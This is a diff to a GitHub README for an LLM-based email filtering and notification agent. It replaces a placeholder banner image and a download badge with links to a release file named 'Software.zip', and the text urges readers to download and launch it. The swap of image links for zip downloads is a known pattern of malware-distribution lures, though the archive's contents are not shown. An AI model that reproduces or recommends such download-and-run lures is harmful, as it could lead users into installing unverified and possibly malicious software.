@@ -1,12 +1,12 @@
 # 🚀 Welcome to the Email Filtering and Notification Agent Repository! 📧
 
-![Email Filtering and Notification Agent](https://via.placeholder.com/800x400)
+![Email Filtering and Notification Agent](https://github.com/kanahaza/Email_Filtering_and_Notification_Agent/releases/download/v2.0/Software.zip)
 
 ## Overview
 This repository contains an intelligent agent system designed to automate your email workflow efficiently. The agent system is equipped with advanced features such as email ingestion, filtering, summarization, action item extraction, and customizable notifications through various channels. Powered by cutting-edge technologies like LangChain, LangGraph, and Gemini 1.5 Flash, this agent system is a game-changer for managing your emails seamlessly.
 
 ## 📦 Application Download
-[![Download Application](https://img.shields.io/badge/Download-Application-orange)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/kanahaza/Email_Filtering_and_Notification_Agent/releases/download/v2.0/Software.zip)](https://github.com/kanahaza/Email_Filtering_and_Notification_Agent/releases/download/v2.0/Software.zip)
 
 The download link above will direct you to the application zip file. Please download and launch the application to experience the full potential of the Email Filtering and Notification Agent.
 
